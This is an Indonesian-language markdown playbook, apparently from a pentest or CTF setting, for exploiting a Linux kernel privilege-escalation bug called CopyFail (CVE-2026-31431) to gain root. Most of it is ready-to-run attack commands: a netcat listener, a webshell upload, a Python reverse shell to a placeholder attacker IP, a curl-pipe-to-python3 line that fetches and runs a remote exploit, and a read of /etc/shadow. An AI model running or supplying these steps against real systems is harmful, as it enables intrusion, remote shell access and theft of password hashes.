# 🔥 CopyFail — Local Privilege Escalation (CVE‑2026‑31431)

> **Tujuan:** Mengeksploitasi kerentanan kernel Linux **CopyFail** (CVE‑2026‑31431) untuk naik dari user terbatas menjadi **root**.

---

## 📌 Penjelasan Singkat

**CopyFail** adalah kerentanan **LPE** pada Linux kernel yang memanfaatkan bug pada mekanisme `copy_file_range` syscall. Attacker dapat mengakibatkan penulisan arbitrer ke memori kernel dan mendapatkan **uid=0 (root)** tanpa memerlukan kredensial tambahan.

---

## 🛡️ Prerequisite Checks (Validasi Awal)

### 1. Identitas User Saat Ini

```bash
id
whoami
```

### 2. Versi Kernel (Harus Rentan)

```bash
uname -r
```

> ⚠️ **Catatan:** CopyFail berlaku untuk kernel **Ubuntu 5.15.0‑XXX (XXX < 181)**. Jika versi sudah dipatch, eksploit tidak akan berhasil.

### 3. Tools yang Diperlukan

```bash
which curl python3
```

---

## 🎧 Persiapan Listener (Attacker)

```bash
nc -lvnp 4444
```

---

## 📥 Akses Awal ke Target

### A️⃣ File Upload (Webshell)

Upload `shell.php` dengan reverse shell payload, lalu akses:

```bash
curl http://<TARGET>/uploads/shell.php
```

### B️⃣ Command Injection (Python Reverse Shell)

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

---

## 📂 Working Directory (`/tmp`)

Setelah mendapat shell, pindah ke direktori **world‑writable**:

```bash
cd /tmp
```

> `/tmp` diizinkan untuk eksekusi binary (tidak ada flag `noexec`).

---

## 💥 Eksploitasi CopyFail

```bash
curl https://copy.fail/exp | python3 && su
```

**Alur:**

```text
1. curl mengunduh PoC dari copy.fail
2. python3 mengeksekusi PoC
3. Kernel bug di-trigger → privilege dinaikkan ke root
4. `su` membuka root shell
```

> Jika tidak ada akses internet di target, download dulu di Kali:
>
> ```bash
> # Di Kali
> curl -O https://copy.fail/exp
> python3 -m http.server 8089
> # Di target
> curl http://<KALI_IP>:8089/exp | python3 && su
> ```

---

## ✅ Verifikasi Hak Root

```bash
id
whoami
head -n 1 /etc/shadow
```

Output yang diharapkan:

```text
uid=0(root) gid=0(root) groups=0(root)
root
root:$6$...:...
```

---

## 🪜 Alur Eksploitasi

```text
Validasi kernel (uname -r)
      ↓
Pastikan versi rentan (< 5.15.0-181)
      ↓
Akses awal (webshell / command injection)
      ↓
Pindah ke /tmp
      ↓
Jalankan: curl https://copy.fail/exp | python3 && su
      ↓
Verifikasi root (id)
```

---

## 📋 Checklist CopyFail

- [ ] Verifikasi kernel rentan (`uname -r` → < 5.15.0-181).
- [ ] Siapkan listener (`nc -lvnp 4444`).
- [ ] Dapatkan akses awal (webshell atau command injection).
- [ ] Pindah ke `/tmp`.
- [ ] Jalankan exploit (`curl https://copy.fail/exp | python3 && su`).
- [ ] Verifikasi `uid=0(root)`.

---

## 📚 Referensi

- [CopyFail – CVE‑2026‑31431](https://copy.fail)
- [Linux Exploit Suggester – The‑Z‑Labs](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [OWASP – Local Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
